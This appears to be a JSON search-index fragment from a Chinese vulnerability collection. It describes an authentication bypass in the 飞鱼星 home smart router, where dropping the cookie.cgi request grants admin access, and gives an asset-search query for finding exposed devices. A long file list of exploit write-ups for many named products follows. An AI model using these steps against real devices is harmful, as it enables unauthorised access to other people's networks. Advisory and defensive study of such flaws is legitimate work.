","date":"0001-01-01","objectID":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"飞鱼星 家用智能路由 cookie.cgi 权限绕过 ","date":"0001-01-01","objectID":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E5%AE%B6%E7%94%A8%E6%99%BA%E8%83%BD%E8%B7%AF%E7%94%B1-cookie.cgi-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/:0:0","tags":null,"title":"","uri":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E5%AE%B6%E7%94%A8%E6%99%BA%E8%83%BD%E8%B7%AF%E7%94%B1-cookie.cgi-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"},{"categories":null,"content":"漏洞描述 飞鱼星 家用智能路由存在权限绕过，通过Drop特定的请求包访问未授权的管理员页面 ","date":"0001-01-01","objectID":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E5%AE%B6%E7%94%A8%E6%99%BA%E8%83%BD%E8%B7%AF%E7%94%B1-cookie.cgi-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/:1:0","tags":null,"title":"","uri":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E5%AE%B6%E7%94%A8%E6%99%BA%E8%83%BD%E8%B7%AF%E7%94%B1-cookie.cgi-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"},{"categories":null,"content":"漏洞影响 飞鱼星 家用智能路由 飞鱼星 企业级智能上网行为管理系统 ","date":"0001-01-01","objectID":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E5%AE%B6%E7%94%A8%E6%99%BA%E8%83%BD%E8%B7%AF%E7%94%B1-cookie.cgi-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/:2:0","tags":null,"title":"","uri":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E5%AE%B6%E7%94%A8%E6%99%BA%E8%83%BD%E8%B7%AF%E7%94%B1-cookie.cgi-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"},{"categories":null,"content":"网络测绘 title=\"飞鱼星家用智能路由\" ","date":"0001-01-01","objectID":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E5%AE%B6%E7%94%A8%E6%99%BA%E8%83%BD%E8%B7%AF%E7%94%B1-cookie.cgi-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/:3:0","tags":null,"title":"","uri":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E5%AE%B6%E7%94%A8%E6%99%BA%E8%83%BD%E8%B7%AF%E7%94%B1-cookie.cgi-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"},{"categories":null,"content":"漏洞复现 登录页面如下 访问 index.html 时会请求 cookie.cgi http://xxx.xxx.xxx.xxx/index.html 页面抓包 Drop掉 cookie.cgi 跳转后台获取了权限 ","date":"0001-01-01","objectID":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E5%AE%B6%E7%94%A8%E6%99%BA%E8%83%BD%E8%B7%AF%E7%94%B1-cookie.cgi-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/:4:0","tags":null,"title":"","uri":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E5%AE%B6%E7%94%A8%E6%99%BA%E8%83%BD%E8%B7%AF%E7%94%B1-cookie.cgi-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"},{"categories":null,"content":"Index of Files 1.py BYTEVALUE智能流控路由器存在命令执行漏洞.docx Casdoor系统 存在信息泄露.docx Cellinx NVT 摄像机 GetFileContent.cgi 任意文件读取漏洞.docx e-office协同办公平台json_common.php存在SQL注入漏洞.pdf EasyCVR视频管理平台存在信息泄露.pdf F22服装管理软件系统openfile.aspx前台任意文件下载.docx Guns快速开发平台 Shiro反序列化.docx H2db console 未授权访问.docx HIKVISION 综合安防管理平台任意文件上传.docx HWL-2511-SSpopen.cgi命令执行漏洞.docx hytec-router-popen-rce.docx I Doc View在线文档预览系统 upload 任意文件读取漏洞.docx I Doc View在线文档预览系统 view 任意文件读取漏洞.docx I Doc View在线文档预览系统 view 服务端请求伪造.docx I Doc View在线文档预览系统RCE(QVD-2023-45061).docx I Doc View在线文档预览系统system rce.docx I Doc View在线文档预览系统存在弱口令.docx jmtr-f22-oa-filedownload.docx NETGEAR DGND3700v2 路由器 setup.cgi 接口身份认证绕过漏洞.docx OnlyIT 进销存财务管理软件默认口令.docx Panabit PA-MINI 智能网关 userverify.cgi 文件默认口令漏洞.docx PandoraFMS 监控软件 SQL注入.docx Saber企业级开发平台任意登录.docx Samsung-WLAN-AP路由器RCE.docx SpringBlade export-user SQL 注入.docx szqh-808gps-downloadLogger-filedownload.docx telesquare-router-getusernamepassword-infolink.docx Telesquare-TLR-2005Ksh路由器getUsernamePassword信息泄露漏洞.docx Tenda 路由器 DownloadCfg 信息泄露漏洞.docx Tosei 自助洗衣机web 管理端network_test.php文件host参数远程命令执行漏洞.docx tosei-network-test-host-rce.docx wanlink-router-exportallSettings-readfile.yaml wanlink_router_api.yaml wavlink adm.cgi命令执行漏洞.docx wavlink mesh.cgi命令执行漏洞（CVE-2022-2486）.docx wavlink nightled.cgi命令执行漏洞（CVE-2022-2487）.docx WAVLINK 多款路由器 live_api.cgi 存在命令执行.docx WAVLINK 多款路由器存在敏感信息泄露漏洞.docx XETUX 软件 dynamiccontent.properties.xhtml 远程代码执行漏洞.docx xxl-job-默认accessToken权限绕过漏洞.docx yb-oa-api-system-executesqlforsingle-sqli.docx zdet-entsoft-customeraction-fileupload.docx Zkteco百傲瑞达安防管理系统平台 Shiro反序列化.docx 万户 ezOFFICE convertFile 文件读取.docx 万户OA check_onlyfield.jsp sql注入漏洞.docx 万户OA DocumentEdit_unite.jsp 存在sql注入.docx 上海冰峰网络有限公司下一代防火墙存在信息泄露.docx 中控太科（上海）电子科技有限公司(公司)时间精细化管理平台存在弱口令.docx 云时空社会化商业 ERP 系统 Shiro 反序列化漏洞.docx 任子行网络技术股份有限公司网络安全审计系统存在命令执行.docx 北京九思协同软件有限公司九思OA wap.do 任意文件读取.docx 北京宏景世纪软件股份有限公司人力资源信息管理系统存在xxe漏洞.pdf 华为Auth-Http Server 1.0任意文件读取.docx 华天动力OA TemplateService 任意文件读取.docx 华测监测预警系统任意读取漏洞.pdf 商混ERP系统 DictionaryEdit.aspx 页面存在SQL注入.docx 多个产商安全产品存在命令执行.docx 多个厂商AC集中管理平台存在信息泄露.docx 大为计算机软件开发有限公司知识产权协同创新管理系统任意密码重置.docx 大华DSS S2-045 OGNL表达式注入.docx 天擎终端安全管理系统clientinfobymid方法SQL注入导致命令执行漏洞.docx 天擎终端安全管理系统getgidsbymids方法 SQL 注入导致命令执行漏洞.docx 天擎终端安全管理系统loglastsync方法SQL注入导致命令执行漏洞.docx 天锐绿盾审批系统默认密码漏洞.docx 奇安信360天擎getsimilarlist存在SQL注入漏洞 (1).docx 奇安信360天擎getsimilarlist存在SQL注入漏洞.docx 奇安信360天擎rptsvcsyncpoint SQL注入漏洞.docx 奥威亚-视频云平台 download 任意文件读取.docx 宇视科技视频监控 main-cgi 文件信息泄露 (1).docx 宇视科技视频监控 main-cgi 文件信息泄露.docx 广东全程云科技有限公司全程云OA svc.asmx 存在sql注入.docx 广州拓波软件科技有限公司 TurboMail 邮件系统 viewfile 文件读取漏洞.docx 广联达 test.aspx 存在信息漏洞.docx 成都海翔软件有限公司海翔药业云平台存在sql注入.pdf 数字通指尖云平台SQL注入 .docx 新华三技术有限公司H3C-下一代防火墙存在命令执行漏洞.docx 时空智友 workflow.sqlResult SQL注入漏洞.docx 时空智友企业流程化管控系统 formservice SQL 注入漏洞.docx 时空智友企业流程化管控系统 formservice 文件上传漏洞.docx 时空智友企业流程化管控系统 login 文件读取漏洞.docx 时空智友企业流程化管控系统 uploadStudioFile 文件创建漏洞.docx 时空智友企业流程化管控系统 wc.db 文件信息泄露漏洞.docx 时空智友企业流程化管控系统敏感信息泄露.docx 易宝OA ExecuteSqlForSingle SQL注入漏洞.docx 易思智能物流无人值守系统-downfile-文件读取.docx 智跃人力资源管理系统 GenerateEntityFromTable.aspx SQL注入漏洞.docx 杭州安恒信息技术股份有限公司明御安全网关存在命令执行.docx 杭州迪普科技股份有限公司DPTech VPN 文件读取漏洞.docx 江苏叁拾叁信息技术有限公司OA存在sql注入.pdf 泛微 download.php 任意文件读取.pdf 泛微 e-Mobile 移动管理平台文件上传漏洞.docx 泛微-eoffice-config-信息泄露.docx 泛微e-cology XmlRpcServlet文件读取.docx 浙大恩特客户资源管理系统 fileupload.jsp 任意文件上传漏洞.docx 浙江大华技术股份有限公司智能物联综合管理平台(ICC)存在任意文件读取.docx 浙江大华技术股份有限公司智能物联综合管理平台(ICC)存在逻辑漏洞.docx 浙江宇视 isc 网络视频录像机 LogReport.php 远程命令执行.docx 润申信息科技 企业标准化管理系统 CommentStandardHandler SQL注入漏洞.docx 润申信息科技 企业标准化管理系统 DefaultHandler SQL注入漏洞.docx 深圳市子辰视讯科技有限公司酒店智慧营销IPTV系统存在sql注入.docx 深圳市强鸿电子有限公司鸿运主动安全云平台downloadLogger 任意文件下载漏洞.docx 深圳市捷顺科技实业股份有限公司JieLink智能终端操作平台 默认口令漏洞.docx 深圳市昂捷信息技术股份有限公司昂捷-ERP EnjoyRMIS_WS信息泄露.docx 湖南建研信息有限公司检测系统文件上传.docx 湖南强智科技发展有限公司教务管理系统存在任意文件下载.docx 用友 GRP-U8 license_check.jsp 存在sql注入.docx 用友 IUFO 信息泄露.docx 用友-U8-Cloud upload.jsp 存在任意文件上传.docx 用友-u8-crm crmdebug 信息泄露.docx 用友-u8-crm help2 文件读取.docx 用友GRP-U8 forgetPassword_old.jsp 存在sql注入.docx 用友GRP-U","date":"0001-01-01","objectID":"/unknownformat/:0:0","tags":null,"title":"","uri":"/unknownformat/"}]